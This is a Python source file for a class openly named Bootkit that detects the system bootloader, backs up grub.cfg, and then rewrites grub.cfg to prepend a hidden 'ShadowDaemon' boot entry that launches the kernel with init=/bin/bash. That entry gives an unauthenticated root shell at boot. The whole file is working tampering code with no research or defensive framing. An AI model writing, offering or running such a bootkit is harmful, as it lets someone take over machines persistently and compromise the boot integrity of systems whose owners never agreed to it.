import os
import shutil

class Bootkit:
    def __init__(self):
        self.bootloader_type = self.detect_bootloader()
    
    def detect_bootloader(self):
        if os.path.exists("/boot/grub/grub.cfg"):
            return "grub"
        elif os.path.exists("/boot/grub2/grub.cfg"):
            return "grub2"
        elif os.path.exists("/boot/syslinux/syslinux.cfg"):
            return "syslinux"
        elif os.path.exists("/boot/efi/EFI"):
            return "uefi"
        return "unknown"
    
    def backup_bootloader(self):
        os.makedirs("/tmp/boot_backup", exist_ok=True)
        if self.bootloader_type in ["grub", "grub2"]:
            shutil.copy2("/boot/grub/grub.cfg", "/tmp/boot_backup/grub.cfg")
        return "Backup saved"
    
    def inject_grub(self):
        grub_cfg = "/boot/grub/grub.cfg"
        if not os.path.exists(grub_cfg):
            grub_cfg = "/boot/grub2/grub.cfg"
        
        with open(grub_cfg, 'r') as f:
            content = f.read()
        
        payload = """
menuentry 'ShadowDaemon' --class shadow {
    echo 'Loading ShadowDaemon...'
    linux /boot/vmlinuz init=/bin/bash
    initrd /boot/initrd.img
}
"""
        with open(grub_cfg, 'w') as f:
            f.write(payload + content)
        return "GRUB bootkit injected!"
    
    def install_bootkit(self):
        result = self.backup_bootloader()
        if self.bootloader_type in ["grub", "grub2"]:
            result += "\n" + self.inject_grub()
        else:
            result += "\nUnsupported bootloader"
        return result